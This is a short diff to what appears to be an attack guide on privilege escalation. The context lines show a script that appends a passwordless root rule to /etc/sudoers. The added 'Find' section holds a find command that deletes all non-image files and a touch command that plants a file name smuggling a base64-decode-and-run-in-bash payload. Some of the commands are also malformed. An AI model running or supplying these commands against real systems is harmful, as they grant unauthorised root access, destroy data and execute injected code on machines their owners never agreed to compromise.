@@ -21,3 +21,11 @@ Step 3: Create a root privilege escalation script
 echo 'echo "youruser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > privesc.sh
 chmod +x privesc.sh
 ```
+
+
+== Find ==
+```
+/usr/bin/find . type f -not -regex '.*\.\(jpg\|png\\gif\)' -exec bash -c "rm -f {}"\;
+touch ./"file.exe; echo base64_string= | base64 -d | bash"
+
+```
